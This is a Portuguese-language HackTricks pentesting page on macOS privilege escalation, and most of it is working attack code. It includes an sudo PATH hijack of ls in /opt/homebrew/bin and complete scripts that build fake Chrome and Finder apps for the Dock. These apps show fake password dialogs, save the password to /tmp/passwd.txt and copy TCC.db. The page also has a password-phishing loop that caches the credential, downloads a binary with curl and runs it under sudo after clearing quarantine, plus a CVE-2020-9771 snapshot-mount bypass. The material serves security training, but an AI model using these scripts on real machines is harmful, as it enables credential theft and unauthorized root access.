# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Se você veio aqui procurando por TCC privilege escalation vá para:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Note que **a maioria dos truques sobre privilege escalation que afetam Linux/Unix também afetam máquinas MacOS**. Então veja:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Interação do Usuário

### Sudo Hijacking

Você pode encontrar a versão original em [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

No entanto, macOS **mantém** o **`PATH`** do usuário quando ele executa **`sudo`**. Isso significa que outra forma de realizar esse ataque seria **hijack other binaries** que a vítima ainda executará ao **running sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Note que um usuário que usa o terminal provavelmente terá o **Homebrew instalado**. Portanto é possível sequestrar binários em **`/opt/homebrew/bin`**.

### Dock Impersonation

Using some **social engineering** you could **impersonate for example Google Chrome** inside the dock and actually execute your own script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Algumas sugestões:

- Verifique no Dock se existe um Chrome, e, nesse caso, **remova** essa entrada e **adicione** a **entrada falsa do Chrome na mesma posição** no array do Dock.
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}

{{#tab name="Finder Impersonation"}}
Algumas sugestões:

- Você **não pode remover Finder do Dock**, então, se for adicioná-lo ao Dock, você pode colocar o Finder falso logo ao lado do real. Para isso você precisa **adicionar a entrada do Finder falso no início do Dock array**.
- Outra opção é não colocá-lo no Dock e apenas abri-lo; "Finder asking to control Finder" não é tão estranho.
- Outra opção para **escalate to root without asking** a senha com uma caixa horrível é fazer o Finder realmente pedir a senha para executar uma ação privilegiada:
- Peça ao Finder para copiar para **`/etc/pam.d`** um novo **`sudo`** arquivo (o prompt pedindo a senha indicará que "Finder wants to copy sudo")
- Peça ao Finder para copiar um novo **Authorization Plugin** (Você pode controlar o nome do arquivo para que o prompt pedindo a senha indique que "Finder wants to copy Finder.bundle")
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware frequentemente abusa da interação do usuário para **capturar uma senha com privilégios sudo** e reutilizá-la programaticamente. Um fluxo comum:

1. Identificar o usuário logado com `whoami`.
2. **Repetir solicitações de senha** até `dscl . -authonly "$user" "$pw"` retornar sucesso.
3. Cachear a credencial (e.g., `/tmp/.pass`) e executar ações privilegiadas com `sudo -S` (senha via stdin).

Exemplo de cadeia mínima:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
A senha roubada pode então ser reutilizada para **limpar a quarentena do Gatekeeper com `xattr -c`**, copiar LaunchDaemons ou outros arquivos privilegiados, e executar estágios adicionais de forma não interativa.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Qualquer usuário** (mesmo não privilegiado) pode criar e montar um snapshot do Time Machine e **acessar TODOS os arquivos** desse snapshot.\
O **único privilégio** necessário é que a aplicação usada (como `Terminal`) tenha **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), o qual precisa ser concedido por um administrador.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Uma explicação mais detalhada pode ser [**encontrada no relatório original**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Informações Sensíveis

Isto pode ser útil para escalar privilégios:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Referências

- [2025, o ano do Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
